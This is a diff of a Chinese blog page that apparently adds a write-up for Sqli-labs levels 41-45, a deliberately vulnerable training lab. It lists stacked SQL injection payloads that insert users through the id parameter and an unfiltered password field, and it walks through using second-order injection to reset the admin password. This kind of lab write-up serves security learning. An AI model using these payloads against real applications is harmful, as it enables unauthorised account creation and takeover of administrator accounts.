@@ -8,18 +8,24 @@
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
   <title>Sqli-labs(第41-50关) | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前一部分链接：第31-40关Write-up Less-31">
+  <meta name="description" content="前一部分链接：第31-40关Write-up Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload 1?id=1;insert into users(id,username,password) values(&amp;apos;37&amp;apos;,&amp;apos;users37&amp;apos;,&amp;apos;password37&amp;apos;);--+ Less-42本">
 <meta name="keywords" content="Sqli-labs">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sqli-labs(第41-50关)">
 <meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/02/02/Sqli-labs 第41-50关/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="前一部分链接：第31-40关Write-up Less-31">
+<meta property="og:description" content="前一部分链接：第31-40关Write-up Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload 1?id=1;insert into users(id,username,password) values(&amp;apos;37&amp;apos;,&amp;apos;users37&amp;apos;,&amp;apos;password37&amp;apos;);--+ Less-42本">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-27T05:35:15.122Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png">
+<meta property="og:updated_time" content="2019-07-28T03:31:08.140Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-labs(第41-50关)">
-<meta name="twitter:description" content="前一部分链接：第31-40关Write-up Less-31">
+<meta name="twitter:description" content="前一部分链接：第31-40关Write-up Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload 1?id=1;insert into users(id,username,password) values(&amp;apos;37&amp;apos;,&amp;apos;users37&amp;apos;,&amp;apos;password37&amp;apos;);--+ Less-42本">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -158,7 +164,32 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
-<h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是<code>整形</code>注入，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>本关通过<code>POST</code>方式提交参数，并且无法<code>创建用户</code>和<code>忘记秘密</code>这两个操作，所以想到应该是结合前面<code>二次注入（存储型注入）</code>+<code>堆叠注入</code>的知识，通过堆叠注入创建一个账号<code>（admin&#39;#）</code>，然后再通过这个账号去修改admin的密码，进入后台</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png" alt="2-1"></p>
+<p>动手尝试一下，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:1&apos;;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br><span class="line"></span><br><span class="line">password:随意</span><br></pre></td></tr></table></figure>
+<p>登录<code>users37</code>时，发现登录不了，试着把注入语句换到password试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>在此登录时发现可以了，之后查看源码发现是username使用<code>mysql_real_escape_string()</code>函数进行了过滤，而password没有过滤。既然可以插入用户，那现在就插入<code>（admin&#39;#）</code>，注意这里的单引号要<code>加一个反斜杠</code>才行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>可以登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-2.png" alt="2-2"></p>
+<p>接下来就是修改密码，先看一下数据库里<code>admin</code>用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-3.png" alt="2-3"></p>
+<p>将admin的密码更改为666，然后再次看一下数据库，更改成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png" alt="2-4"></p>
+<p>并且可以登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png" alt="2-5"></p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>通过报错信息可以知道，与前一关不一样的就是，参数通过<code>(&#39;&#39;)</code>包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;);insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>其他一样，，不再赘述</p>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>除了没有报错信息之外，这关与Less-42没有区别，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>除了没有报错信息之外，这关与Less-43没有区别，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;);insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2>
       
 
       
@@ -374,19 +405,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -394,11 +417,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+                <a href="javascript:void(0)" class="js-tag color2">Kali系统</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -407,6 +434,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
               </li>
              
               <li class="article-tag-list-item">
